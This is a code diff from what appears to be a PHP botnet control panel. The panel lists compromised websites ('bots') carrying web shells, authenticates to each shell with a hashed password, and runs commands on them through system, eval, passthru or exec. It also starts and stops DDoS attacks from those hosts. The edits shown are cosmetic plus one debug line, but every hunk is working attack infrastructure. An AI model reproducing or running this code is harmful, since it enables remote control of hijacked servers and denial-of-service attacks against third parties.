@@ -143,10 +143,11 @@ function showbots() {
 	echo '<tr><td><b>ID</b></td><td><b>URL</b></td><td><b>DDOS</b></td><td><b>STATUS</b></td></tr>';
 	while($row = mysqli_fetch_assoc($data)) {
     
-		$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
+		$source = conn($row['url'] . '?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
 		if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 			$status = 'OK';
 		} else {
+			echo $source;
 			$status = 'BAD';
 		}
 		
@@ -189,7 +190,7 @@ $id = 0;
 while($row = mysqli_fetch_assoc($rows)) {
 
 
-$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
+$source = conn($row['url'] . '?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
 if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $status = 'OK';
 $os = explode("{:|", $source);
@@ -732,7 +733,7 @@ function ddos() {
 			$x = 0;
 			while($row = mysqli_fetch_assoc($rows)) {
 
-				$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
+				$source = conn($row['url'] . '?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
 				if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 					$x++;
 					$ch = curl_init();
@@ -769,7 +770,7 @@ function ddos() {
             $y = 0;
             while($row = mysqli_fetch_assoc($rows)) {
 	
-$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
+$source = conn($row['url'] . '?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
 if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $y++;
 $ch = curl_init();
@@ -844,7 +845,7 @@ if($row !== false) {
 
 if($_POST['sup'] == 'kill') {
 
-$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
+$source = conn($row['url'] . '?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
 if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $ch = curl_init();
 if(USE_PROXY == 1) {
@@ -878,7 +879,7 @@ echo '<br /><p>Killed all actions for id <b>'.$_POST['botid1'].'</b>.</p>';
 
         } elseif($_POST['sup'] == 'attack') {
 
-$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
+$source = conn($row['url'] . '?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
 if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $ch = curl_init();
 if(USE_PROXY == 1) {
@@ -932,7 +933,7 @@ $rows = mysqli_query($conn,'SELECT * FROM `bots`');
 
 while($row = mysqli_fetch_assoc($rows)) {
 
-$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
+$source = conn($row['url'] . '?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
 if(strpos($source, md5(WEBSHELL_PASS . date("h:d"))) && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
 $x = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_='.$_POST['func'].'&__='.urlencode($_POST['cmd']));
 
